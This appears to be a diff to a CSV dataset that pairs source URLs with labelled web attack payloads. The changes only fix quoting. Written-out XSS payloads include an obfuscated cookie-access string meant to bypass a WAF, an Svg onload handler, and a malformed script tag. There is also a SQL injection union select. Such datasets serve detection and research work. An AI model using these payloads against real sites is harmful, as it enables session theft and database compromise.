@@ -474,5 +474,5 @@ https://packetstormsecurity.com/files/173143/Office-Suite-Premium-10.9.1.42602-C
 https://medium.com/@youghourtaghannei/cloudflare-bypass-and-exploit-your-xss-e720b7333305,javas%09cript:ghi=%27)%3E%27,you=%27(top%5B%22docum%22%2B%22ent%22%5D.cookie%27;HTMLElement%5B%27inne%27%2B%27rHTML%27%5D=%27%3CSvg/OnLoad=alert%27%2Brob%2Beco;//,xss
 https://vulners.com/github/GHSA-8FV7-WQ38-F5C9?utm_source=rss&utm_medium=rss&utm_campaign=rss,&lt;script&gt;,xss
 https://www.youtube.com/watch?v=LZqTeVuaIL4,null /*!12345union*/ select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,sqli
-https://twitter.com/Cyber_Berkkut/status/1691944550200119713,"&gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;,xss
-https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4,<=script>=alert("hacked")<=/scirpt>=,xss
+https://twitter.com/Cyber_Berkkut/status/1691944550200119713,"""&gt;&lt;Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==""))&gt;",xss
+https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4,"<=script>=alert(""hacked"")<=/scirpt>=",xss
